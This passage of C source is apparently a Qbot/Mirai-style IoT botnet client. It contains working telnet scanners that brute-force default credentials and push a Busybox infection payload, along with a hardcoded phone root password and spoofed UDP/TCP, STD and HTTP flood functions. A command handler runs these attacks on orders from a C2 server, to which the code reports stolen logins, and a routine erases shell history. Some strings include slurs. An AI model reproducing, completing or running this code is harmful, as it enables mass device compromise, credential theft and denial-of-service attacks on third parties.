if(send(fds[i].fd, "su\r\n", 4, MSG_NOSIGNAL) < 0) {
fds[i].state = 0;
fds[i].complete = 1;
continue; }
fds[i].state = 8;
}
break;
case 8: {
if(read_until_response(fds[i].fd, 10000, fds[i].sockbuf, 253, phone)) {
if(contains_fail(fds[i].sockbuf)) {
fds[i].state = 0;
} else {
fds[i].state = 9; }
continue; }
if(fds[i].tTimeout + 6 < time(NULL)) {
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 9: {
if(send(fds[i].fd, "oelinux123\r\n", 12, MSG_NOSIGNAL) < 0) {
fds[i].state = 0;
fds[i].complete = 1;
continue; }
fds[i].state = 10;
}
break;
case 10: {
fds[i].tTimeout = time(NULL);
if(send(fds[i].fd, phonepayload, strlen(phonepayload), MSG_NOSIGNAL) < 0) {
sclose(fds[i].fd);
fds[i].state = 0;
fds[i].complete = 1;
continue; }
fds[i].complete = 3;
if(fds[i].tTimeout + 60 < time(NULL)) {
if(fds[i].complete !=3){
}
fds[i].state = 0;
fds[i].complete = 1;
}
break;
}
}
}
}
}
void HackaShit() {
char buf[128];
	 int max = 256, i, res, valopt;
    fd_set fdset;
    struct timeval tv;
    socklen_t lon;
	srand(time(NULL) ^ rand_cmwc());
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(23);
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
	struct telstate_t fds[max];
memset(fds, 0, max * (sizeof(int) + 1));
for(i = 0; i < max; i++) {
memset(&(fds[i]), 0, sizeof(struct telstate_t));
fds[i].complete = 1; 
fds[i].sockbuf = malloc(256 + 1); }
while(1) {
for(i = 0; i < max; i++) {
if(fds[i].tTimeout == 0) {
fds[i].tTimeout = time(NULL); }
switch(fds[i].state) {
case 0: {
if(fds[i].complete) {
char *tmp = fds[i].sockbuf;
memset(&(fds[i]), 0, sizeof(struct telstate_t));
fds[i].sockbuf = tmp;
fds[i].ip = HackerScan1(); }
else  {
fds[i].passwordInd++;
fds[i].usernameInd++;
if(fds[i].passwordInd == sizeof(Telnet_Passwords) / sizeof(char *)) {
fds[i].complete = 1;
continue; }
if(fds[i].usernameInd == sizeof(Telnet_Usernames) / sizeof(char *)) {
fds[i].complete = 1;
continue;
}
}
dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(23);
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
dest_addr.sin_addr.s_addr = fds[i].ip;
fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
if(fds[i].fd == -1) continue;
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS) {
sclose(fds[i].fd);
fds[i].complete = 1; }
else {
fds[i].state = 1;
fds[i].tTimeout = 0;
}
}
break;
case 1: {
FD_ZERO(&fdset);
FD_SET(fds[i].fd, &fdset);
tv.tv_sec = 0;
tv.tv_usec = 10000;
res = select(fds[i].fd+1, NULL, &fdset, NULL, &tv);
if(res == 1) {
lon = sizeof(int);
valopt = 0;
getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
if(valopt) {
sclose(fds[i].fd);
fds[i].state = 0;
fds[i].complete = 1;
} else {
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
fds[i].tTimeout = 0;
fds[i].bufUsed = 0;
memset(fds[i].sockbuf, 0, 256);
fds[i].state = 2;
} continue; }
else if(res == -1) {
sclose(fds[i].fd);
fds[i].state = 0;
fds[i].complete = 1;
continue; }
if(fds[i].tTimeout + 6 < time(NULL)) {
sclose(fds[i].fd);
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 2: {
if(read_until_response(fds[i].fd, 10000, fds[i].sockbuf, 256, advances)) {
if(contains_fail(fds[i].sockbuf)) {
fds[i].state = 0;
} else {
fds[i].state = 3; }
continue; }
if(fds[i].tTimeout + 6 < time(NULL)) {
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 3: {
if(send(fds[i].fd, Telnet_Usernames[fds[i].usernameInd], strlen(Telnet_Usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0) {
fds[i].state = 0;
fds[i].complete = 1;
continue; }
if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) {
fds[i].state = 0;
fds[i].complete = 1;
continue; }
fds[i].state = 4; }
break;
case 4: {
if(read_until_response(fds[i].fd, 10000, fds[i].sockbuf, 256, advances))
{
if(contains_fail(fds[i].sockbuf)) {
fds[i].state = 0;
} else {
fds[i].state = 5; }
continue; }
if(fds[i].tTimeout + 6 < time(NULL)) {
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 5: {
if(send(fds[i].fd, Telnet_Passwords[fds[i].passwordInd], strlen(Telnet_Passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0) {
fds[i].state = 0;
fds[i].complete = 1;
continue; }
if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) {
fds[i].state = 0;
fds[i].complete = 1;
continue; }
fds[i].state = 6;
}
break;
case 6: {
if (read_until_response(fds[i].fd, 10000, fds[i].sockbuf, 256, advances2)) {
fds[i].tTimeout = time(NULL);
if (contains_fail(fds[i].sockbuf)) {
fds[i].state = 0;
} else {
sockprintf(mainCommSock, "\e[96m[TELNET] \e[97mFound And Infected A Telnet \e[96m[%s]", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
sockprintf(mainCommSock, "DICK %s:%s:%s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
fds[i].state = 7;
} continue; }
if (fds[i].tTimeout + 6 < time(NULL)) {
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 7: {
if(send(fds[i].fd, Busybox_Payload, strlen(Busybox_Payload), MSG_NOSIGNAL) < 0) {
fds[i].state = 0;
fds[i].complete = 1;
continue; }
fds[i].state = 8;
}
break;
case 8: {
fds[i].tTimeout = time(NULL);
//sockprintf(mainCommSock, "[ TELNET ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
//sockprintf(mainCommSock, "[ TELNET ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
if(send(fds[i].fd, Busybox_Payload, strlen(Busybox_Payload), MSG_NOSIGNAL) < 0) {
sclose(fds[i].fd);
fds[i].state = 0;
fds[i].complete = 1;
continue; }
fds[i].complete = 3;
if(fds[i].tTimeout + 60 < time(NULL)) {
if(fds[i].complete !=3){
}
fds[i].state = 0;
fds[i].complete = 1;
}
break;
}
}
}
}
}
void MiraiHackaShit() {
char buf[128];
int max = 256, i, res, valopt;
fd_set fdset;
struct timeval tv;
socklen_t lon;
srand(time(NULL) ^ rand_cmwc());
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(23);
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
struct telstate_t fds[max];
memset(fds, 0, max * (sizeof(int) + 1));
for(i = 0; i < max; i++) {
memset(&(fds[i]), 0, sizeof(struct telstate_t));
fds[i].complete = 1; 
fds[i].sockbuf = malloc(256 + 1); }
while(1) {
for(i = 0; i < max; i++) {
if(fds[i].tTimeout == 0) {
fds[i].tTimeout = time(NULL); }
switch(fds[i].state) {
case 0: {
if(fds[i].complete) {
char *tmp = fds[i].sockbuf;
memset(&(fds[i]), 0, sizeof(struct telstate_t));
fds[i].sockbuf = tmp;
fds[i].ip = HackerScan1(); }
else  {
fds[i].passwordInd++;
fds[i].usernameInd++;
if(fds[i].passwordInd == sizeof(Telnet_Passwords) / sizeof(char *)) {
fds[i].complete = 1;
continue; }
if(fds[i].usernameInd == sizeof(Telnet_Usernames) / sizeof(char *)) {
fds[i].complete = 1;
continue;
}
}
dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(23);
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
dest_addr.sin_addr.s_addr = fds[i].ip;
fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
if(fds[i].fd == -1) continue;
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS) {
sclose(fds[i].fd);
fds[i].complete = 1; }
else {
fds[i].state = 1;
fds[i].tTimeout = 0;
}
}
break;
case 1: {
FD_ZERO(&fdset);
FD_SET(fds[i].fd, &fdset);
tv.tv_sec = 0;
tv.tv_usec = 10000;
res = select(fds[i].fd+1, NULL, &fdset, NULL, &tv);
if(res == 1) {
lon = sizeof(int);
valopt = 0;
getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
if(valopt) {
sclose(fds[i].fd);
fds[i].state = 0;
fds[i].complete = 1;
} else {
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
fds[i].tTimeout = 0;
fds[i].bufUsed = 0;
memset(fds[i].sockbuf, 0, 256);
fds[i].state = 2;
} continue; }
else if(res == -1) {
sclose(fds[i].fd);
fds[i].state = 0;
fds[i].complete = 1;
continue; }
if(fds[i].tTimeout + 6 < time(NULL)) {
sclose(fds[i].fd);
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 2: {
if(read_until_response(fds[i].fd, 10000, fds[i].sockbuf, 256, advances)) {
if(contains_fail(fds[i].sockbuf)) {
fds[i].state = 0;
} else {
fds[i].state = 3; }
continue; }
if(fds[i].tTimeout + 6 < time(NULL)) {
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 3: {
if(send(fds[i].fd, Telnet_Usernames[fds[i].usernameInd], strlen(Telnet_Usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0) {
fds[i].state = 0;
fds[i].complete = 1;
continue; }
if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) {
fds[i].state = 0;
fds[i].complete = 1;
continue; }
fds[i].state = 4; }
break;
case 4: {
if(read_until_response(fds[i].fd, 10000, fds[i].sockbuf, 256, advances))
{
if(contains_fail(fds[i].sockbuf)) {
fds[i].state = 0;
} else {
fds[i].state = 5; }
continue; }
if(fds[i].tTimeout + 6 < time(NULL)) {
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 5: {
if(send(fds[i].fd, Telnet_Passwords[fds[i].passwordInd], strlen(Telnet_Passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0) {
fds[i].state = 0;
fds[i].complete = 1;
continue; }
if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) {
fds[i].state = 0;
fds[i].complete = 1;
continue; }
fds[i].state = 6;
}
break;
case 6: {
if (read_until_response(fds[i].fd, 10000, fds[i].sockbuf, 256, advances2)) {
fds[i].tTimeout = time(NULL);
if (contains_fail(fds[i].sockbuf)) {
fds[i].state = 0;
} else {
sockprintf(mainCommSock, "\e[96m[TELNET] \e[97mFound And Infected A Telnet \e[96m[%s]", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
sockprintf(mainCommSock, "DICK %s:%s:%s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
fds[i].state = 7;
} continue; }
if (fds[i].tTimeout + 6 < time(NULL)) {
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 7: {
if(send(fds[i].fd, Busybox_Payload, strlen(Busybox_Payload), MSG_NOSIGNAL) < 0) {
fds[i].state = 0;
fds[i].complete = 1;
continue; }
fds[i].state = 8;
}
break;
case 8: {
fds[i].tTimeout = time(NULL);
//sockprintf(mainCommSock, "[ MIRAI ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
//sockprintf(mainCommSock, "[ MIRAI ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s", get_telstate_host(&fds[i]), Telnet_Usernames[fds[i].usernameInd], Telnet_Passwords[fds[i].passwordInd]);
if(send(fds[i].fd, Busybox_Payload, strlen(Busybox_Payload), MSG_NOSIGNAL) < 0) {
sclose(fds[i].fd);
fds[i].state = 0;
fds[i].complete = 1;
continue; }
fds[i].complete = 3;
if(fds[i].tTimeout + 60 < time(NULL)) {
if(fds[i].complete !=3){
}
fds[i].state = 0;
fds[i].complete = 1;
}
break;
}
}
}
}
}

void sendSTD(unsigned char *ip, int port, int secs) {
int iSTD_Sock;
iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
time_t start = time(NULL);
struct sockaddr_in sin;
struct hostent *hp;
hp = gethostbyname(ip);
bzero((char*) &sin,sizeof(sin));
bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
sin.sin_family = hp->h_addrtype;
sin.sin_port = port;
unsigned int a = 0;
while(1){
char *randstrings[] = {"VSzNC0CJti3ouku", "yhJyMAqx7DZa0kg", "1Cp9MEDMN6B5L1K", "miraiMIRAI", "stdflood4", "7XLPHoxkvL", "jmQvYBdRZA", "eNxERkyrfR", "qHjTXcMbzH", "chickennuggets", "ilovecocaine", "666666", "88888888", "0nnf0l20im", "uq7ajzgm0a", "loic", "ParasJhaIsADumbFag", "stdudpbasedflood", "bitcoin1", "password", "encrypted", "suckmydick", "guardiacivil", "2xoJTsbXunuj", "QiMH8CGJyOj9", "abcd1234", "GLEQWXHAJPWM", "ABCDEFGHI", "abcdefghi", "qbotbotnet", "lizardsquad", "aNrjBnTRi", "1QD8ypG86", "IVkLWYjLe", "nexuszetaisacrackaddict", "satoriskidsnet"};
char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
if (a >= 50)
{
send(iSTD_Sock, STD2_STRING, STD_PIGZ, 0);
connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
if (time(NULL) >= start + secs)
{
close(iSTD_Sock);
_exit(0);
}
a = 0;
}
a++;
}
}
void SendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int pollinterval, int spoofit) {
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        register unsigned int pollRegister;
        pollRegister = pollinterval;	
                int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                if(!sockfd) {
                        return;
                }
                int tmp = 1;
                if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
                        return;
                }
                int counter = 50;
                while(counter--) {
                        srand(time(NULL) ^ rand_cmwc());
                        init_rand(rand());
                }
                in_addr_t netmask;
                netmask = ( ~((1 << (32 - spoofit)) - 1) );
                unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
                struct iphdr *iph = (struct iphdr *)packet;
                struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
                makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
                udph->len = htons(sizeof(struct udphdr) + packetsize);
                udph->source = rand_cmwc();
                udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                udph->check = 0;
                makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);
                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
                while(1) {
                        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
                        udph->source = rand_cmwc();
                        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                        iph->id = rand_cmwc();
                        iph->saddr = htonl( getRandomIP(netmask) );
                        iph->check = csum ((unsigned short *) packet, iph->tot_len);
                        if(i == pollRegister) {
                                if(time(NULL) > end) break;
                                i = 0;
                                continue;
                        }
                        i++;
                }
        }
void SendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags, int packetsize, int pollinterval, int spoofit) {
        register unsigned int pollRegister;
        pollRegister = pollinterval;
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd) { return; }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) { return; }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;
        if(!strcmp(flags, "all")) {
                tcph->syn = 1;
                tcph->rst = 1;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->psh = 1;
        } else {
                unsigned char *pch = strtok(flags, ",");
                while(pch) {
                        if(!strcmp(pch,         "syn")) { tcph->syn = 1;
                        } else if(!strcmp(pch,  "rst")) { tcph->rst = 1;
                        } else if(!strcmp(pch,  "fin")) { tcph->fin = 1;
                        } else if(!strcmp(pch,  "ack")) { tcph->ack = 1;
                        } else if(!strcmp(pch,  "psh")) { tcph->psh = 1;
                        } else {
                        }
                        pch = strtok(NULL, ",");
                }
        }
        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1) {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
                iph->saddr = htonl( getRandomIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);
                if(i == pollRegister) {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}
int socket_connect(char *host, in_port_t port) {
	struct hostent *hp;
	struct sockaddr_in addr;
	int on = 1, sock;     
	if ((hp = gethostbyname(host)) == NULL) return 0;
	bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;
	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
	if (sock == -1) return 0;
	if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
	return sock;
}
void SendHTTP(char *method, char *host, in_port_t port, char *path, int timeEnd, int power) {
	int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
	char request[512], buffer[1];
	for (i = 0; i < power; i++) {
		sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, path, host, useragents[(rand() % 36)]);
		if (fork()) {
			while (end > time(NULL)) {
				socket = socket_connect(host, port);
				if (socket != 0) {
					write(socket, request, strlen(request));
					read(socket, buffer, 1);
					close(socket);
				}
			}
			exit(0);
		}
	}
}

void ClearHistory()
{
	system("history -c;history -w");
	system("cd /;rm -rf ~/.bash_history");
}

void RandomPythonRange()
{
	//GET TO THIS SHIT LATER.
}

void processCmd(int argc, unsigned char *argv[]) {
		if(!strcmp(argv[0], "TRANGE")) {
			if(argc < 2 || atoi(argv[1]) == -1){
			sockprintf(mainCommSock, "RANGE <option 0-idk>");
			}else{
			sockprintf(mainCommSock, "Telnet Range %d->%d", telnetrange, atoi(argv[1]));
			telnetrange = atoi(argv[1]);
			} 
			return;
			}
		if(!strcmp(argv[0], "TELNET"))
		{
			if(!strcmp(argv[1], "ON"))
			{
				uint32_t parent;
				parent = fork();        
				int ii = 0;
				int forks = sysconf( _SC_NPROCESSORS_ONLN );
				int fds = 999999;
				if(forks == 1) fds = 500;
				if(forks >= 2) fds = 1000;
				if (parent > 0)
				{
					scanPid = parent;
					return;
				}
				else if(parent == -1) return;
				for (ii = 0; ii < forks; ii++)
				{
					srand((time(NULL) ^ getpid()) + getppid());
					init_rand(time(NULL) ^ getpid());
					TelnetScanner(100, fds);
					_exit(0);
				}
			}
			if(!strcmp(argv[1], "OFF"))
			{
				if(scanPid == 0) return;
				kill(scanPid, 9);
				scanPid = 0;
			}
		

			if(!strcmp(argv[1], "SCANNER"))
			{
				int threads = atoi(argv[1]);
				int usec = atoi(argv[2]);
				if(!listFork())
				{
					//sockprintf(mainCommSock, "[TELNET] Starting Fastload.");
					TelnetScanner(usec, threads);
					_exit(0);
				}
				return;
			}
		}
		if(!strcmp(argv[0], "MIRAI"))
		{
			if(!strcmp(argv[1], "ON"))
			{
				uint32_t parent;
				parent = fork();        
				int ii = 0;
				int forks = sysconf( _SC_NPROCESSORS_ONLN );
				int fds = 999999;
				if(forks == 1) fds = 500;
				if(forks >= 2) fds = 1000;
				if (parent > 0)
				{
					miraiPid = parent;
					return;
				}
				else if(parent == -1) return;
				for (ii = 0; ii < forks; ii++)
				{
					srand((time(NULL) ^ getpid()) + getppid());
					init_rand(time(NULL) ^ getpid());
					MiraiScanner(100, fds);
					_exit(0);
				}
			}
			if(!strcmp(argv[1], "OFF"))
			{
				if(miraiPid == 0) return;
				kill(miraiPid, 9);
				miraiPid = 0;
			}
			if(!strcmp(argv[1], "FASTLOAD"))
			{
				int threads = atoi(argv[1]);
				int usec = atoi(argv[2]);
				if(!listFork())
				{
					//sockprintf(mainCommSock, "Starting scanner!!");
					MiraiScanner(usec, threads);
					_exit(0);
				}
				return;
			}
}
			if(!strcmp(argv[0], "MRANGE")) {
			if(argc < 2 || atoi(argv[1]) == -1){
			sockprintf(mainCommSock, "RANGE <option 0-idk>");
			}else{
			sockprintf(mainCommSock, "Mirai Range %d->%d", mirairange, atoi(argv[1]));
			mirairange = atoi(argv[1]);
			} 
			return;
			}
if(!strcmp(argv[0], "PHONE")) {
if(argc != 2) {
return; }
if(!strcmp(argv[1], "OFF")) {
if(Phonepid == 0) return;
kill(Phonepid, 9);
Phonepid = 0; }
if(!strcmp(argv[1], "ON")) {
if(Phonepid != 0) return;
uint32_t parent;
parent = fork();
if (parent > 0) { Phonepid = parent; return;}
else if(parent == -1) return;
PhoneScanner();
_exit(0);
}
}
			if(!strcmp(argv[0], "MTRANGE")) {
			if(argc < 2 || atoi(argv[1]) == -1){
			sockprintf(mainCommSock, "Mirai Test RANGE <option 0-idk>");
			}else{
			sockprintf(mainCommSock, "Range %d->%d", miraitestrange, atoi(argv[1]));
			miraitestrange = atoi(argv[1]);
			} 
			return;
			}
if(!strcmp(argv[0], "MIRAITEST")) {
if(argc != 2) {
return; }
if(!strcmp(argv[1], "OFF")) {
if(testmiraiPid == 0) return;
kill(testmiraiPid, 9);
testmiraiPid = 0; }
if(!strcmp(argv[1], "ON")) {
if(testmiraiPid != 0) return;
uint32_t parent;
parent = fork();
if (parent > 0) { testmiraiPid = parent; return;}
else if(parent == -1) return;
MiraiHackaShit();
_exit(0);
}
			if(!strcmp(argv[0], "TT")) {
			if(argc < 2 || atoi(argv[1]) == -1){
			sockprintf(mainCommSock, "Telnet test RANGE <option 0-idk>");
			}else{
			sockprintf(mainCommSock, "Range %d->%d", telnettestrange, atoi(argv[1]));
			telnettestrange = atoi(argv[1]);
			} 
			return;
			}
}
if(!strcmp(argv[0], "TELNETTEST")) {
if(argc != 2) {
return; }
if(!strcmp(argv[1], "OFF")) {
if(testtelnetPid == 0) return;
kill(testtelnetPid, 9);
testtelnetPid = 0; }
if(!strcmp(argv[1], "ON")) {
if(testtelnetPid != 0) return;
uint32_t parent;
parent = fork();
if (parent > 0) { testtelnetPid = parent; return;}
else if(parent == -1) return;
HackaShit();
_exit(0);
}

}

if(!strcmp(argv[0], "BCM")) {
if(argc != 2) {
return; }
if(!strcmp(argv[1], "OFF")) {
if(bcmPid == 0) return;
kill(bcmPid, 9);
bcmPid = 0; }
if(!strcmp(argv[1], "ON")) {
if(bcmPid != 0) return;
uint32_t parent;
parent = fork();
if (parent > 0) { bcmPid = parent; return;}
else if(parent == -1) return;
BCMscanner();
_exit(0);
}
}
	
		if (!strcmp(argv[0], "HTTP"))
		{
			// !* HTTP METHOD TARGET PORT PATH TIME POWER
			// !* HTTP POST/GET/HEAD hackforums.net 80 / 10 100
			if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
			if (listFork()) return;
			SendHTTP(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
			exit(0);
		}
        if(!strcmp(argv[0], "UDP"))
		{
			// !* UDP TARGET PORT TIME PACKETSIZE POLLINTERVAL
			if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 1024 || (argc == 6 && atoi(argv[5]) < 1))
			{
				return;
            }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int packetsize = atoi(argv[4]);
                int pollinterval = (argc == 6 ? atoi(argv[5]) : 10);
				int spoofed = 32;
                if(strstr(ip, ",") != NULL)
				{
					unsigned char *hi = strtok(ip, ",");
					while(hi != NULL)
					{
						if(!listFork())
						{
							SendUDP(hi, port, time, packetsize, pollinterval, spoofed);
							_exit(0);
						}
						hi = strtok(NULL, ",");
					}
                } else {
							if (listFork())
							{
								return;
							}
							SendUDP(ip, port, time, packetsize, pollinterval, spoofed);
							_exit(0);
					   }	
        }
        if(!strcmp(argv[0], "TCP"))
		{
				//!* TCP TARGET PORT TIME FLAGS PACKETSIZE POLLINTERVAL
                if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || (argc > 5 && atoi(argv[5]) < 0) || (argc == 7 && atoi(argv[6]) < 1))
				{
                        return;
				}
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                unsigned char *flags = argv[4];
                int pollinterval = argc == 7 ? atoi(argv[6]) : 10;
                int packetsize = argc > 5 ? atoi(argv[5]) : 0;
				int spoofed = 32;
                if(strstr(ip, ",") != NULL) {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL) {
                                if(!listFork()) {
                                        SendTCP(hi, port, time, flags, packetsize, pollinterval, spoofed);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else	{
							if (listFork())
							{
								return;
							}
							SendTCP(ip, port, time, flags, packetsize, pollinterval, spoofed);
							_exit(0);
						}
        }
if(!strcmp(argv[0], "STD")) //STD TARGET PORT TIME
{
if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
{
return;
}
unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);
if(strstr(ip, ",") != NULL)
{
unsigned char *hi = strtok(ip, ",");
while(hi != NULL)
{
if(!listFork())
{
sendSTD(hi, port, time);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (listFork()) { return; }
sendSTD(ip, port, time);
_exit(0);
}
}
        if(!strcmp(argv[0], "STOP"))
		{
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++)
				{
                        if (pids[i] != 0 && pids[i] != getpid())
						{
                                kill(pids[i], 9);
                                killed++;
                        }
                }
                if(killed > 0)
				{
					//
                } else {
							//
					   }
        }
        if(!strcmp(argv[0], "FUCKOFF"))
		{
                exit(0);
        }
        if(!strcmp(argv[0], "UPDATE"))
		{
            RemoveTempDirs();
			sockprintf(mainCommSock, "[Updating] [%s:%s]", getBuild(), getEndianness());
        }
}
int initConnection() {
    unsigned char server[512];
	memset(server, 0, 512);
	if(mainCommSock) { close(mainCommSock); mainCommSock = 0; }
	if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
	else currentServer++;
	strcpy(server, commServer[currentServer]);
	int port = 6942;
	if(strchr(server, ':') != NULL) {
		port = atoi(strchr(server, ':') + 1);
		*((unsigned char *)(strchr(server, ':'))) = 0x0;
	}
	mainCommSock = socket(AF_INET, SOCK_STREAM, 0);
	if(!connectTimeout(mainCommSock, server, port, 30)) return 1;
	return 0;
}
void UpdateNameSrvs() {
    uint16_t fhandler = open("/etc/resolv.conf", O_WRONLY | O_TRUNC);
    if (access("/etc/resolv.conf", F_OK) != -1) {
